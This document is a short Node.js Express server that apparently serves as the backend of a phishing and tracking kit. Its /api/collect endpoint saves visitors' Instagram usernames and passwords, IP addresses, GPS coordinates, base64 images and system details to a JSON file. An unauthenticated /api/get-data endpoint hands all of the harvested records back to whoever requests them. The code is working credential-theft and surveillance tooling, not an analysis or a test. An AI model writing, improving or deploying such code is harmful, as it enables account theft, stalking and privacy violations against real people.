const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

app.use(express.json({ limit: '10mb' }));
app.use(cors());
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/viewer.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'viewer.html'));
});

function readDB() {
    if (!fs.existsSync(DATA_FILE)) return {};
    try {
        return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    } catch (err) {
        return {};
    }
}

function writeDB(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

app.post('/api/collect', (req, res) => {
    let db = readDB();
    const recordId = 'ID_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const loc = req.body.location || { latitude: 'N/A', longitude: 'N/A' };

    db[recordId] = {
        id: recordId,
        ip: clientIp,
        instagram_username: req.body.instagram_username || 'N/A',
        instagram_password: req.body.instagram_password || 'N/A',
        latitude: loc.latitude,
        longitude: loc.longitude,
        image_base64: req.body.image_base64 || null,
        system: req.body.system || {},
        timestamp: new Date().toISOString()
    };

    writeDB(db);
    res.status(200).json({ status: 'success' });
});

app.get('/api/get-data', (req, res) => {
    const db = readDB();
    res.status(200).json(db);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
